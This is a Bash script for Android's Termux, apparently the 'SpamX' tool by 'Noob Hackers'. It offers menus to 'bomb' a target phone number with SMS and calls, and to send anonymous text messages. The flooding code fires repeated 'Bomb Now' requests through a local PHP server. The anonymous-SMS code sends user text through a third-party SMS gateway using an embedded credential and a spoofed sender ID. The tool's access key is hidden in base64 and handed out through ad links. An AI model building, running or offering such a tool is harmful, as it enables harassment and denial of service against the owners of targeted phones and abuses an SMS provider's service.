#PUBLISHING WITHOUT CREDITS OR PERMISSION CAN LEAD YOU TO PAY FOR THAT
#BY NOOB HACKERS (SUBSCRIBE US ON YOUTUBE)
#####3#3#
clear

check(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/spamx/master/update.v1.1 2>/dev/null; then
cd $HOME/spamx/server/updates
echo "spmx" > update.txt
else
echo
fi
}
check
option(){
if [ -f "$HOME/spamx/server/updates/update.txt" ];then
cd $HOME/spamx/server/updates
bash update.sh
else
echo " "
fi
}
option
check1(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/spamx.v.1 2>/dev/null; then
cd $HOME/spamx/server/updates
echo "spmx" > patch.txt
else
echo
fi
}
check1
option1(){
if [ -f "/data/data/com.termux/files/spamx/server/updates/patch.txt" ];then
cd $HOME/spamx/server/updates
bash patch.sh
else
echo " "
fi
}
option1
bnr(){
clear
echo -e '

\e[91m        ██████  ██▓███   ▄▄▄       ███▄ ▄███▓▒██   ██▒
      ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▒▒ █ █ ▒░
      ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░░░  █   ░
        ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██  ░ █ █ ▒ 
      ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒ ▒██▒
\e[92m      ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░▒▒ ░ ░▓ ░
      ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░░   ░▒ ░
      ░  ░  ░  ░░         ░   ▒   ░      ░    ░    ░  
            ░                 ░  ░       ░    ░    ░  ' 
echo -e "                  \e[92m >\e[93m By Noob Hackers \e[92m<"
echo -e "               \e[92m>\e[93m github.com/noob-hackers \e[92m<"
echo -e "               \e[92m >\e[91m YOUTUBE:-\e[92mNOOB HACKERS \e[92m<"
echo
}
men(){
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Bombing\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Key\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m About\e[93m"
echo -e "\e[92m[\e[91m4\e[92m]\e[93m Update\e[93m"
echo -e "\e[92m[\e[91m5\e[92m]\e[93m Subscribe\e[93m"
echo -e "\e[92m[\e[91m6\e[92m]\e[93m Group\e[93m"
echo -e "\e[92m[\e[91m7\e[92m]\e[93m Follow\e[93m"
echo -e "\e[92m[\e[91m8\e[92m]\e[93m Exit\e[93m"
echo ''
echo -ne "SELECT OPTION ~> \e[0m"
read opt1
if [ $opt1 = "1" ];
then
spams
elif [ $opt1 = "2" ];
then
am start -a android.intent.action.VIEW -d https://shrinke.me/spamxcc > /dev/null 2>&1
bnr
men
elif [ $opt1 = "3" ];
then
abot
elif [ $opt1 = "4" ];
then
cd /data/data/com.termux/files/home/spamx/server/updates
bash update.sh
elif [ $opt1 = "5" ];
then
am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
bnr
men
elif [ $opt1 = "6" ];
then
am start -a android.intent.action.VIEW -d https://bitly.com/nhwhatschat > /dev/null 2>&1
bnr
men
elif [ $opt1 = "7" ];
then
am start -a android.intent.action.VIEW -d https://bit.ly/nhfollowus > /dev/null 2>&1 
bnr
men
elif [ $opt1 = "8" ];
then
exit 1
else
echo -e "                      \e[93m !....OOPS \e[0m"
fi
}
spams(){
clear
bnr
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Bomb Sms+Call\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Bomb Sms\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m Bomb Call\e[93m"
echo -e "\e[92m[\e[91m4\e[92m]\e[93m Anonymous Sms\e[93m"
echo -e "\e[92m[\e[91m5\e[92m]\e[93m Back\e[93m"
echo ''
echo -ne "SELECT OPTION ~> \e[0m"
read opt2
if [ $opt2 = "1" ];
then
massbmb
elif [ $opt2 = "2" ];
then
smsbmb
elif [ $opt2 = "3" ];
then
callbmb
elif [ $opt2 = "4" ];
then
anonmenu
elif [ $opt2 = "5" ];
then
bnr
men
else
echo -e "                     \e[93m !....OOPS \e[0m"
exit 1
fi
}
smsbmb(){
massbmb
}
callbmb(){
echo -e "\e[93m                ON UPDATES WE WILL UPDATE SOON....!"
sleep 4.0
bnr
men
}
anonmenu(){
if [ -f /data/data/com.termux/files/home/spamx/server/anon/dat.txt ];
then
anondat
else
anonmen
fi
}
anondat(){
cd /data/data/com.termux/files/home/spamx/server/anon
dt=$(date +%A)
dro=$(cat dat.txt)
if [ "$dt" == "$dro" ];
then
clear
echo
echo
echo
echo
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m  |  \e[91mDAILY LIMIT REACHED (100%)\e[34m  |"
echo -e "        \e[34m  |  \e[92m    COME ON TOMORROW      \e[34m  |"
echo -e "        \e[34m ===============================================\e[34m"
echo
echo
echo
echo
sleep 4.0
bnr
men
else
cd /data/data/com.termux/files/home/spamx/server/anon
rm *.txt
anonmen
fi
}
anonmen(){
anoncrk
clear
echo -e "
\e[91m         ██████
   \e[91m    ██████████
     \e[91m █\e[96m ▄\e[91m▀█  █▀\e[96m▄ \e[91m█
     ▐▌           ▌  
     █▌▀▄  ▄▄  ▄▀▐█
    ▐██  ▀▀  ▀▀  ██▌   SPAMX \e[91mV.1\e[92m BY NOOB HACKERS\e[91m
   ▄████▄   ▌  ▄████▄
\e[0m"
echo
echo -ne "\e[93mPROVIDE MESSAGE: "
read test
echo -ne "\e[93mMOB NUMBER: "
read mob
read -s -p "ACCESS KEY: " secret
otext=`echo 'c3BhbXg=' | base64 --decode`
anontest
}
anontest(){
if [[ $secret = $otext ]];
then
auth1
else
clear
echo " "
echo -e "               \e[34m ============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
echo -e "               \e[34m |                          |"
echo -e "               \e[34m |    Use shortlink for key |"
echo -e "               \e[34m |\e[92m  https://shrinke.me/tXwz\e[34m |"
echo -e "               \e[34m |            [OR]          |"
echo -e "               \e[34m |\e[92mhttps://bit.ly/nhwhatschat\e[34m|"
echo -e "               \e[34m ============================\e[34m"
echo " "
sleep 5.0
bnr
men
fi
}
auth1() {
clear
cd /data/data/com.termux/files/home/spamx/server/anon
remn=$(cat ctt.txt) >/dev/null 2>&1
clear
echo -e "\e[93m
        ╭━━━━━━━━━━━╮
        ┃━━━●━══━━━━┃
        ┃           ┃ \e[91m TARGET-\e[92m$mob \e[93m
        ┃   \e[91mSPAMX\e[93m   ┃ \e[91m ATTACK-\e[92mANONYMOUS SMS \e[93m
        ┃           ┃ \e[93m
        ┃           ┃ [\e[91m1\e[93m]\e[92m ANON \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
        ┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
        ┃           ┃     \e[91m REMAINING-\e[92m["$remn"] \e[93m
        ┃\e[34m"$mob"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
        ┃           ┃ --------------------------
        ┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/9113948054
        ╰━━━━━━━━━━━╯
"
curl -L -s "http://mobicomm.dove-sms.com//submitsms.jsp?user=Justlook&key=e9c5f59940XX&mobile=$mob&message=$test&senderid=CLNEXT&accusage=1" > utis.txt
#echo success > utis.txt
value=$( grep -o "success" utis.txt)
if [[ $value = "success" ]]
then
echo
echo
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m   |  \e[34mSent \e[93m$test \e[34mTo \e[91m$mob \e[34msuccessfully\e[34m  |"
echo -e "        \e[34m ===============================================\e[34m"
echo
echo
echo
anondd
else
clear
echo " "
echo -e "               \e[34m ============================\e[34m"
echo -e "               \e[34m |  \e[93mOOPS SERVER ISSUES..!\e[34m   |"
echo -e "               \e[34m |   we will update it soon |"
echo -e "               \e[34m ============================\e[34m"
echo " "
fi
}
anondd(){
cd /data/data/com.termux/files/home/spamx/server/anon
name=remin
if [[ -e $name.txt || -L $name.txt ]] ; then
   i=0
    while [[ -e $name-$i.txt || -L $name-$i.txt ]] ; do
        let i++
    done
    name=$name-$i
fi

touch -- "$name".txt

#anonct=$(ls -l | grep -v ^l | wc -l)
cd /data/data/com.termux/files/home/spamx/server/anon
anonct=$(find remin*.txt | wc -l)
if [[ $anonct = "1" ]]; then
#echo "20 remaining"
echo "20" > ctt.txt
elif [[ $anonct = "2" ]]; then
#echo "19 remaining"
echo "19" > ctt.txt
elif [[ $anonct = "3" ]]; then
#echo "18 remaining"
echo "18" > ctt.txt
elif [[ $anonct = "4" ]]; then
#echo "17 remaining"
echo "17" > ctt.txt
elif [[ $anonct = "5" ]]; then
#echo "16 remaining"
echo "16" > ctt.txt
elif [[ $anonct = "6" ]]; then
#echo "15 remaining"
echo "15" > ctt.txt
elif [[ $anonct = "7" ]]; then
#echo "14 remaining"
echo "14" > ctt.txt
elif [[ $anonct = "8" ]]; then
#echo "13 remaining"
echo "13" > ctt.txt
elif [[ $anonct = "9" ]]; then
#echo "12 remaining"
echo "12" > ctt.txt
elif [[ $anonct = "10" ]]; then
#echo "11 remaining"
echo "11" > ctt.txt
elif [[ $anonct = "11" ]]; then
#echo "10 remaining"
echo "10" > ctt.txt
elif [[ $anonct = "12" ]]; then
#echo "9 remaining"
echo "9" > ctt.txt
elif [[ $anonct = "13" ]]; then
#echo "8 remaining"
echo "8" > ctt.txt
elif [[ $anonct = "14" ]]; then
#echo "7 remaining"
echo "7" > ctt.txt
elif [[ $anonct = "15" ]]; then
#echo "6 remaining"
echo "6" > ctt.txt
elif [[ $anonct = "16" ]]; then
#echo "5 remaining"
echo "5" > ctt.txt
elif [[ $anonct = "17" ]]; then
#echo "4 remaining"
echo "4" > ctt.txt
elif [[ $anonct = "18" ]]; then
#echo "3 remaining"
echo "3" > ctt.txt
elif [[ $anonct = "19" ]]; then
#echo "2 remaining"
echo "2" > ctt.txt
elif [[ $anonct = "20" ]]; then
#echo "1 remaining"
echo "0" > ctt.txt
elif [[ $anonct = "21" ]]; then
anondot
else
anondot
fi
echo -ne "NEXT: "
read anonopt
if [ $anonopt = "1" ];
then
anonmenu
elif [ $anonopt = "2" ];
then                                                              
spams
elif [ $anonopt = "3" ];
then
anonmenu
elif [ $anonopt = "4" ];
then
exit 1
else
echo "                      xx ERROR....! xx"
fi
}
anoncrk(){
FILE=/data/data/com.termux/files/home/spamx/server/anon/limit.txt
if [ -f "$FILE" ]; then
anondot
fi
}
anondot(){
cd /data/data/com.termux/files/home/spamx/server/anon
dt=$(date +%A)
chk=$(date +%A > dat.txt)
dro=$(cat dat.txt)
if [ "$dt" == "$dro" ];
then
echo
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m  |  \e[91mDAILY LIMIT REACHED (100%)\e[34m  |"
echo -e "        \e[34m  |  \e[92m    COME ON TOMORROW      \e[34m  |"
echo -e "        \e[34m ===============================================\e[34m"
echo
echo
echo '                             Oops...Come Tomorrow' > limit.txt
exit 1
else
anonmenu
fi
}
massbmb(){
clear
echo -e "\e[93m

                   ,--\e[91m.+,\e[93m
                __/   \e[91m-*-\e[93m
              *d08b*  \e[91m'%\e[93m
              0088MM
              *9MMP* SPAMX \e[91mV.1\e[92m BY NOOB HACKERS\e[93m

"
echo -ne "NUMBER: \e[0m"  
read num
read -s -p "ACCESS KEY: " access
bas=`echo 'c3BhbXg=' | base64 --decode`                   
if [[ $access = $bas ]];                                   
then
clear
echo -e "\e[93m
        ╭━━━━━━━━━━━╮
        ┃━━━●━══━━━━┃
        ┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
        ┃   \e[91mSPAMX\e[93m   ┃ \e[91m ATTACK-\e[92mMASS BOMBING \e[93m
        ┃           ┃ \e[93m
        ┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
        ┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m 
        ┃           ┃ 
        ┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
        ┃           ┃ --------------------------
        ┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/9113948054
        ╰━━━━━━━━━━━╯
"
killall -9 php >/dev/null 2>&1 
cd /data/data/com.termux/files/home/spamx/server/callnsms
php -S localhost:8080 >/dev/null 2>&1 &
#cd /data/data/com.termux/files/home/spamx/server/callnsms
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0                                                                                                 
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then 
massbmb
elif [ $optz = "2" ];
then
spams
elif [ $optz = "3" ];
then
massbmb
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
else
echo " "
echo -e "               \e[34m ============================\e[34m" 
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
echo -e "               \e[34m |                          |"
echo -e "               \e[34m |    Use shortlink for key |"
echo -e "               \e[34m |\e[92m  https://shrinke.me/tXwz\e[34m |"
echo -e "               \e[34m |            [OR]          |"
echo -e "               \e[34m |\e[92mhttps://bit.ly/nhwhatschat\e[34m|"
echo -e "               \e[34m ============================\e[34m"
echo " "
fi
}
abot(){
clear
echo -e '\e[91m
                   ──▐─▌──▐─▌──
                   ─▐▌─▐▌▐▌─▐▌─
                   ─█▄▀▄██▄▀▄█─
                   ──▄──██▌─▄──
                   ▄▀─█▀██▀█─▀▄
                   ▐▌▐▌─▐▌─▐▌▐▌
                   ─▐─█────█─▌─
                   ────▌──▐────
'
echo -e "\e[93m                  CALL ME \e[92mNITRO" | pv -qL 10                                                                    
echo -e "\e[93m             IAM FROM \e[92mNOOB HACKERS" | pv -qL 10                                                                 
echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10            
echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10                                                              
echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
echo -e "\e[93m        MY WEBSITE:\e[92m www.noob-hackers.com\e[0m" | pv -qL 10                                                      
echo -e "\e[92m                BYEE.............." | pv -qL 10
sleep 4.0
bnr
men
}
bnr
men
